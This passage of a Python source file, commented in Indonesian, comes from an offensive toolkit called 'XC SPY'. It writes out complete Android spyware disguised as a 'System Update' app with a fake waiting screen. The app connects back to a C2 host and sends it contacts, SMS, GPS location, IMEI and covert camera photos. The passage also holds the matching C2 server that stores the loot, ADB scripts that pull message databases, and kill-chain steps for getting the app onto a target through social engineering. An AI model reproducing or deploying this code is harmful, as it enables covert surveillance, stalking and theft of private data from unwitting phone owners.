            "/data/data/com.android.providers.telephony/databases/mmssms.db",
            f"{{loot_dev}}/mmssms.db")

        # Call log
        calls = adb(dev, "shell", "content query --uri content://call_log/calls --projection number:duration:type:date | head -50")
        with open(f"{{loot_dev}}/calllog.txt","w") as f: f.write(calls)

        print(f"  [+] Loot saved: {{loot_dev}}/")

print(f"\\n[SPECTRE-B] Done!")
'''

    # ── Mode C: Python APK Spyware (Buildozer) ──────────
    apk_main = f'''# SPECTRE-C: Python Android Spyware
# Build dengan Buildozer → .apk siap deploy
# pip install buildozer cython
# buildozer -v android debug

from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
import threading, socket, json, os, time, base64

C2_HOST = "{lhost}"
C2_PORT = {lport + 1}

class SpectreService:
    def __init__(self):
        self.sock  = None
        self.running = False

    def connect(self):
        while True:
            try:
                self.sock = socket.socket()
                self.sock.connect((C2_HOST, C2_PORT))
                self.running = True
                self.beacon()
                self.loop()
            except:
                time.sleep(15)

    def send(self, data):
        try:
            self.sock.sendall((json.dumps(data) + "\\n").encode())
        except: pass

    def beacon(self):
        from android import mActivity
        ctx = mActivity.getApplicationContext()
        info = {{
            "type":    "beacon",
            "model":   android.os.Build.MODEL,
            "android": str(android.os.Build.VERSION.RELEASE),
            "pkg":     str(ctx.getPackageName()),
        }}
        try:
            import jnius
            tm = jnius.autoclass("android.telephony.TelephonyManager")
            mgr = mActivity.getSystemService("phone")
            info["imei"]  = mgr.getDeviceId() or ""
            info["phone"] = mgr.getLine1Number() or ""
        except: pass
        self.send(info)

    def get_location(self):
        try:
            from plyer import gps
            gps.configure(on_location=self._on_loc)
            gps.start(minTime=0, minDistance=0)
            time.sleep(3)
        except: pass

    def _on_loc(self, **kwargs):
        self.send({{
            "type": "gps",
            "lat":  kwargs.get("lat"),
            "lon":  kwargs.get("lon"),
            "alt":  kwargs.get("altitude"),
        }})

    def get_contacts(self):
        try:
            import jnius
            ctx = jnius.autoclass("org.kivy.android.PythonActivity").mActivity
            cr  = ctx.getContentResolver()
            cur = cr.query(
                jnius.autoclass("android.provider.ContactsContract$CommonDataKinds$Phone").CONTENT_URI,
                None, None, None, None)
            contacts = []
            while cur.moveToNext():
                name = cur.getString(cur.getColumnIndex("display_name")) or ""
                num  = cur.getString(cur.getColumnIndex("data1")) or ""
                contacts.append({{"name": name, "num": num}})
            cur.close()
            self.send({{"type":"contacts","data":contacts[:200]}})
        except Exception as e:
            self.send({{"type":"contacts","err":str(e)}})

    def get_sms(self):
        try:
            import jnius
            ctx = jnius.autoclass("org.kivy.android.PythonActivity").mActivity
            cr  = ctx.getContentResolver()
            cur = cr.query(
                jnius.autoclass("android.net.Uri").parse("content://sms/inbox"),
                None, None, None, "date DESC LIMIT 100")
            sms = []
            while cur.moveToNext():
                sms.append({{
                    "from":    cur.getString(cur.getColumnIndex("address")) or "",
                    "body":    cur.getString(cur.getColumnIndex("body")) or "",
                    "date":    cur.getLong(cur.getColumnIndex("date")),
                }})
            cur.close()
            self.send({{"type":"sms","data":sms}})
        except Exception as e:
            self.send({{"type":"sms","err":str(e)}})

    def take_photo(self, camera=0):
        try:
            from plyer import camera as cam
            path = "/sdcard/.xc_cam.jpg"
            cam.take_picture(filename=path, on_complete=lambda fn: self._send_file("photo", fn))
        except Exception as e:
            self.send({{"type":"photo","err":str(e)}})

    def _send_file(self, ftype, path):
        try:
            with open(path,"rb") as f:
                data = base64.b64encode(f.read()).decode()
            self.send({{"type":ftype,"data":data,"path":path}})
            os.remove(path)
        except: pass

    def loop(self):
        while self.running:
            try:
                buf = b""
                while not buf.endswith(b"\\n"):
                    chunk = self.sock.recv(4096)
                    if not chunk: raise ConnectionError
                    buf += chunk
                cmd = json.loads(buf.strip())
                t = cmd.get("cmd","")
                if   t == "location":  threading.Thread(target=self.get_location, daemon=True).start()
                elif t == "contacts":  threading.Thread(target=self.get_contacts, daemon=True).start()
                elif t == "sms":       threading.Thread(target=self.get_sms, daemon=True).start()
                elif t == "photo":     threading.Thread(target=self.take_photo, daemon=True).start()
                elif t == "ping":      self.send({{"type":"pong"}})
            except: break
        self.running = False

class SpectreApp(App):
    def build(self):
        # Jalankan spy service di background thread
        svc = SpectreService()
        threading.Thread(target=svc.connect, daemon=True).start()
        # UI palsu biar keliatan normal
        return Label(text="System Update\\nPlease wait...", color=(0.2,0.2,0.2,1))

    def on_pause(self): return True
    def on_resume(self): pass

if __name__ == "__main__":
    SpectreApp().run()
'''

    buildozer_spec = f'''[app]
title           = System Update
package.name    = systemupdate
package.domain  = com.android.system
source.dir      = .
source.include_exts = py,kv
version         = 1.0
requirements    = python3,kivy,plyer,requests
android.permissions = INTERNET,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,READ_CONTACTS,READ_SMS,CAMERA,READ_CALL_LOG,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,RECEIVE_BOOT_COMPLETED,FOREGROUND_SERVICE
android.api     = 33
android.minapi  = 24
android.ndk     = 25b
android.arch    = arm64-v8a
android.allow_backup = False
orientation     = portrait
fullscreen      = 0

[buildozer]
log_level = 1
warn_on_root = 1
'''

    # ── Mode D: SPECTRE C2 Server ──────────────────────
    c2_server = f'''#!/usr/bin/env python3
# SPECTRE C2 — receiver untuk Android spyware
# python3 spy_output/spectre_c2.py
import socket, threading, json, os, base64, sys
from datetime import datetime

HOST = "0.0.0.0"
PORT = {lport + 1}
LOOT = "spectre_loot"
os.makedirs(LOOT, exist_ok=True)

R="\033[91m"; G="\033[92m"; Y="\033[93m"; C="\033[96m"; M="\033[95m"; RST="\033[0m"; D="\033[90m"

agents = {{}}
lock   = threading.Lock()

def log(msg, color=C): print(f"  {{color}}{{msg}}{{RST}}")

def save_loot(aid, fname, data_b64):
    d = os.path.join(LOOT, aid.replace(":","_"))
    os.makedirs(d, exist_ok=True)
    path = os.path.join(d, fname)
    with open(path,"wb") as f:
        f.write(base64.b64decode(data_b64))
    log(f"[SAVED] {{path}}", Y)
    return path

def handle(conn, addr):
    aid = f"{{addr[0]}}:{{addr[1]}}"
    buf = b""
    log(f"[CONN] {{aid}}", G)
    try:
        while True:
            chunk = conn.recv(65535)
            if not chunk: break
            buf += chunk
            while b"\\n" in buf:
                line, buf = buf.split(b"\\n", 1)
                if not line.strip(): continue
                try:
                    pkt = json.loads(line.strip())
                except: continue
                t = pkt.get("type","")

                if t == "beacon":
                    with lock: agents[aid] = {{"sock":conn,"info":pkt,"addr":addr}}
                    log(f"[BEACON] {{aid}}", M)
                    log(f"  Model: {{pkt.get('model','?')}} | Android: {{pkt.get('android','?')}}", D)
                    log(f"  IMEI: {{pkt.get('imei','?')}} | Phone: {{pkt.get('phone','?')}}", D)

                elif t == "gps":
                    lat, lon = pkt.get("lat"), pkt.get("lon")
                    log(f"[GPS] {{aid}} → lat={{lat}} lon={{lon}}", Y)
                    log(f"  Maps: https://maps.google.com/?q={{lat}},{{lon}}", C)
                    d = os.path.join(LOOT, aid.replace(":","_"))
                    os.makedirs(d, exist_ok=True)
                    with open(os.path.join(d,"gps.txt"),"a") as f:
                        f.write(f"{{datetime.now()}} lat={{lat}} lon={{lon}}\\n")

                elif t == "contacts":
                    contacts = pkt.get("data",[])
                    log(f"[CONTACTS] {{aid}} → {{len(contacts)}} entries", Y)
                    d = os.path.join(LOOT, aid.replace(":","_"))
                    os.makedirs(d, exist_ok=True)
                    with open(os.path.join(d,"contacts.json"),"w") as f:
                        json.dump(contacts, f, indent=2, ensure_ascii=False)
                    for c in contacts[:5]:
                        log(f"  {{c.get('name','?')}} — {{c.get('num','?')}}", D)

                elif t == "sms":
                    msgs = pkt.get("data",[])
                    log(f"[SMS] {{aid}} → {{len(msgs)}} messages", Y)
                    d = os.path.join(LOOT, aid.replace(":","_"))
                    os.makedirs(d, exist_ok=True)
                    with open(os.path.join(d,"sms.json"),"w") as f:
                        json.dump(msgs, f, indent=2, ensure_ascii=False)
                    for m in msgs[:3]:
                        log(f"  FROM: {{m.get('from','?')}}  {{m.get('body','')[:60]}}", D)

                elif t == "photo":
                    ts = datetime.now().strftime("%H%M%S")
                    save_loot(aid, f"photo_{{ts}}.jpg", pkt.get("data",""))

                elif t == "pong":
                    log(f"[PONG] {{aid}}", D)

    except Exception as e:
        pass
    finally:
        with lock: agents.pop(aid, None)
        conn.close()
        log(f"[DISC] {{aid}}", R)

def send_cmd(aid, cmd_dict):
    a = agents.get(aid)
    if not a: log(f"Agent {{aid}} not found", R); return
    try:
        a["sock"].sendall((json.dumps(cmd_dict)+"\\n").encode())
    except Exception as e:
        log(f"Send error: {{e}}", R)

def menu():
    print(f"\\n{{M}}[SPECTRE C2]{{RST}} {{HOST}}:{{PORT}}")
    while True:
        try:
            c = input(f"\\n{{M}}SPECTRE{{RST}} » ").strip()
            if not c: continue

            if c == "list":
                if not agents: log("No agents", R); continue
                for i,(k,v) in enumerate(agents.items()):
                    inf = v.get("info",{{}})
                    log(f"[{{i}}] {{k}} | {{inf.get('model','?')}} Android {{inf.get('android','?')}}", G)

            elif c.startswith("use "):
                idx = int(c[4:])
                aid = list(agents.keys())[idx]
                log(f"[SESSION] {{aid}} — type 'help' for commands", Y)
                while True:
                    try:
                        inp = input(f"{{R}}{{aid}}{{RST}} $ ").strip()
                        if inp == "back": break
                        elif inp == "help":
                            print(f"""
  location  → request GPS coords
  contacts  → dump all contacts
  sms       → dump SMS inbox
  photo     → take front camera photo
  ping      → check alive""")
                        elif inp in ("location","contacts","sms","photo","ping"):
                            send_cmd(aid, {{"cmd": inp}})
                            log(f"Sent: {{inp}}", C)
                        else:
                            log("Unknown. Type 'help'", R)
                    except KeyboardInterrupt: break

            elif c in ("exit","quit"): sys.exit(0)
            elif c == "loot":
                for d in os.listdir(LOOT):
                    full = os.path.join(LOOT,d)
                    if os.path.isdir(full):
                        files = os.listdir(full)
                        log(f"  {{d}}/ — {{len(files)}} files", Y)
            else:
                log("Commands: list · use <n> · loot · exit", D)

        except (KeyboardInterrupt, EOFError):
            print(); break

srv = socket.socket()
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind((HOST, PORT))
srv.listen(20)
print(f"{{G}}[SPECTRE C2]{{RST}} Listening {{HOST}}:{{PORT}}")
threading.Thread(target=lambda: [handle(*srv.accept()) for _ in iter(int,1)], daemon=True).start()
menu()
'''

    # Save semua file
    save_tool("spectre_adb_usb.py",   adb_usb)
    save_tool("spectre_adb_net.py",   adb_net)
    save_tool("spectre_c2.py",        c2_server)

    # APK source di subfolder
    apk_dir = os.path.join(OUT_DIR, "spectre_apk")
    os.makedirs(apk_dir, exist_ok=True)
    for fname, code in [("main.py", apk_main), ("buildozer.spec", buildozer_spec)]:
        path = os.path.join(apk_dir, fname)
        with open(path, "w") as f: f.write(code)
        saved(path)

    print(f"""
  {M}{'─'*52}{RST}
  {Y}SPECTRE v2 — 4 Mode:{RST}
  {M}{'─'*52}{RST}

  {C}[A] ADB USB — physical access (USB debug ON):{RST}
  {G}python3 spy_output/spectre_adb_usb.py{RST}
  {W}→ grab kontak, SMS, WA, foto, GPS, chrome, telegram{RST}
  {W}→ loot tersimpan di: spectre_loot/{RST}

  {C}[B] ADB Network — scan WiFi target, no USB:{RST}
  {G}python3 spy_output/spectre_adb_net.py [subnet]{RST}
  {G}python3 spy_output/spectre_adb_net.py 192.168.1.0/24{RST}
  {W}→ scan port 5555, auto-connect, auto-grab{RST}
  {W}→ butuh: target aktifin ADB over WiFi di Dev Options{RST}

  {C}[C] APK Spyware — custom Python APK:{RST}
  {G}cd spy_output/spectre_apk/{RST}
  {G}pip install buildozer cython{RST}
  {G}buildozer -v android debug{RST}
  {W}→ generates bin/*.apk — install ke target{RST}
  {W}→ tampil sebagai "System Update" (UI palsu){RST}
  {W}→ permission: GPS, kontak, SMS, kamera, call log{RST}
  {W}→ connect balik ke SPECTRE C2{RST}

  {C}[D] SPECTRE C2 — receiver data dari APK:{RST}
  {G}python3 spy_output/spectre_c2.py{RST}
  {W}→ port {lport + 1} (APK → C2){RST}
  {W}→ command: location · contacts · sms · photo · ping{RST}
  {W}→ semua loot auto-save di spectre_loot/<ip>/{RST}

  {M}{'─'*52}{RST}
  {Y}Kill Chain (no USB):{RST}
  {G}1. python3 spy_output/spectre_c2.py          ← C2 up{RST}
  {G}2. buildozer android debug                    ← build APK{RST}
  {G}3. Install APK ke target (social eng / ADB)  ← deploy{RST}
  {G}4. SPECTRE C2: list → use 0 → location/sms  ← control{RST}
  {M}{'─'*52}{RST}
""")

# ═══════════════════════════════════════════════════════
#  BLACKOUT — Full Arsenal
# ═══════════════════════════════════════════════════════

def module_blackout(lhost, lport):
    section("BLACKOUT — FULL ARSENAL")
    module_phantom(lhost, lport)
    module_shadow()
    module_eclipse()
    module_venom()
    module_nexus(lhost, lport)
    module_mirage(lhost, lport)
    module_spectre(lhost, lport)

    section("BLACKOUT COMPLETE — Summary")
    print(f"""
  {G}Files generated di spy_output/:{RST}
  {W}phantom_agent.py    → RAT agent (deploy ke target){RST}
  {W}phantom_server.py   → RAT C2 server{RST}
  {W}shadow_keylogger.py → Keylogger silent{RST}
  {W}eclipse_screen.py   → Screen spy{RST}
  {W}venom_sniffer.py    → Network sniffer{RST}
  {W}nexus_server.py     → Multi-agent C2{RST}
  {W}nexus_agent.py      → C2 agent minimal{RST}
  {W}mirage_server.py    → Payload HTTP server{RST}
  {W}spectre_adb.py      → Android ADB spy{RST}
  {W}loader.ps1          → PS1 downloader{RST}

  {M}Kill Chain Tergacor:{RST}
  {G}1. python3 spy_output/phantom_server.py  ← C2 up{RST}
  {G}2. pyinstaller --onefile phantom_agent.py ← compile{RST}
  {G}3. python3 spy_output/mirage_server.py   ← host payload{RST}
  {G}4. Kirim .hta ke target → klik → owned 🔥{RST}
""")

# ═══════════════════════════════════════════════════════
#  INTERACTIVE MENU
# ═══════════════════════════════════════════════════════

CODENAMES = {
    "PHANTOM": ("phantom", "Modul 1 — PC Takeover (Pure Python RAT)"),
    "SHADOW":  ("shadow",  "Modul 2 — Keylogger silent"),
    "SPECTRE": ("spectre", "Modul 3 — Android Spy (ADB + APK)"),
    "MIRAGE":  ("mirage",  "Modul 4 — Social Lure generator"),
    "VENOM":   ("venom",   "Modul 5 — Network sniffer MITM"),
    "NEXUS":   ("nexus",   "Modul 6 — Multi-agent C2"),
    "ECLIPSE": ("eclipse", "Modul 7 — Screen spy silent"),
    "BLACKOUT":("blackout","FULL ARSENAL — semua modul"),
    "P":  ("phantom",""), "SH": ("shadow",""),  "SP": ("spectre",""),
    "M":  ("mirage",""),  "V":  ("venom",""),   "N":  ("nexus",""),
    "E":  ("eclipse",""), "B":  ("blackout",""),
}

def show_menu(lhost):
    banner()
    print(f"  {D}IP: {W}{lhost}{RST}  |  {D}Output: {W}{OUT_DIR}/{RST}\n")
    rows = [
        ("PHANTOM","P",  "Modul 1","PC Takeover — Pure Python RAT"),
        ("SHADOW", "SH", "Modul 2","Keylogger — silent email exfil"),
        ("SPECTRE","SP", "Modul 3","Android — ADB spy + APK trojan"),
        ("MIRAGE", "M",  "Modul 4","Social lure — HTA / PS1 / server"),
        ("VENOM",  "V",  "Modul 5","Network sniffer — HTTP creds"),
        ("NEXUS",  "N",  "Modul 6","C2 — multi-agent command center"),
        ("ECLIPSE","E",  "Modul 7","Screen spy — screenshot exfil"),
    ]
    print(f"  {M}{'─'*50}{RST}")
    print(f"  {Y}{'CODENAME':<12}{'KEY':<6}{'MODULE':<10}DESCRIPTION{RST}")
    print(f"  {M}{'─'*50}{RST}")
    for name, key, mod, desc in rows:
        print(f"  {C}{name:<12}{RST}[{W}{key}{RST}] {D}{mod} — {desc}{RST}")
    print(f"  {M}{'─'*50}{RST}")
    print(f"  {R}{BOLD}{'BLACKOUT':<12}{RST}[{W}B{RST}]  {R}FULL ARSENAL — generate semua!{RST}")
    print(f"  {M}{'─'*50}{RST}")
    print(f"  {D}help · clear · exit{RST}\n")

def interactive_menu(lhost, lport, target, iface):
    show_menu(lhost)
    dispatch = {
        "phantom": lambda: module_phantom(lhost, lport),
        "shadow":  lambda: module_shadow(),
        "spectre": lambda: module_spectre(lhost, lport),
        "mirage":  lambda: module_mirage(lhost, lport, target),
        "venom":   lambda: module_venom(iface),
        "nexus":   lambda: module_nexus(lhost, lport),
        "eclipse": lambda: module_eclipse(),
        "blackout":lambda: module_blackout(lhost, lport),
    }
    while True:
        try:
            cmd = input(f"\n  {M}XC-SPY{RST} {D}»{RST} ").strip().upper()
        except (KeyboardInterrupt, EOFError):
            print(f"\n  {D}DAR DER DOR. Stay dangerous.{RST}\n"); break
        if not cmd: continue
        if cmd in ("EXIT","QUIT","Q"):
            print(f"\n  {D}DAR DER DOR. Stay dangerous.{RST}\n"); break
        if cmd in ("HELP","?"):
            show_menu(lhost); continue
        if cmd in ("CLEAR","CLS"):
            os.system("clear" if os.name != "nt" else "cls")
            show_menu(lhost); continue
        if cmd in CODENAMES:
            mode_key, desc = CODENAMES[cmd]
            if desc: info(f"Executing {cmd} — {desc}")
            time.sleep(0.2)
            dispatch[mode_key]()
        else:
            matches = [k for k in CODENAMES if k.startswith(cmd) and CODENAMES[k][1]]
            if len(matches) == 1:
                mode_key, desc = CODENAMES[matches[0]]
                info(f"Executing {matches[0]}")
                dispatch[mode_key]()
            else:
                print(f"  {R}[!]{RST} Unknown: {cmd} — ketik HELP")

# ═══════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(description="XC SPY — Surveillance Toolkit")
    parser.add_argument("mode", nargs="?", default=None,
        help="PHANTOM|SHADOW|SPECTRE|MIRAGE|VENOM|NEXUS|ECLIPSE|BLACKOUT (kosong=menu)")
    parser.add_argument("--lhost", help="C2 IP (auto-detect jika kosong)")
    parser.add_argument("--lport", type=int, default=4444)
    parser.add_argument("--target", default="target")
    parser.add_argument("--iface", default="wlan0")
    args = parser.parse_args()
    lhost = args.lhost or get_local_ip()

    dispatch = {
        "phantom": lambda: module_phantom(lhost, args.lport),
        "shadow":  lambda: module_shadow(),
        "spectre": lambda: module_spectre(lhost, args.lport),
        "mirage":  lambda: module_mirage(lhost, args.lport, args.target),
        "venom":   lambda: module_venom(args.iface),
        "nexus":   lambda: module_nexus(lhost, args.lport),
        "eclipse": lambda: module_eclipse(),
        "blackout":lambda: module_blackout(lhost, args.lport),
    }

    if args.mode is None:
        interactive_menu(lhost, args.lport, args.target, args.iface)
    else:
        banner()
        key = args.mode.upper()
        mode_key = CODENAMES.get(key, (args.mode.lower(), ""))[0]
        if mode_key in dispatch:
            dispatch[mode_key]()
        else:
            print(f"{R}[!] Unknown: {args.mode}{RST}")

if __name__ == "__main__":
    main()
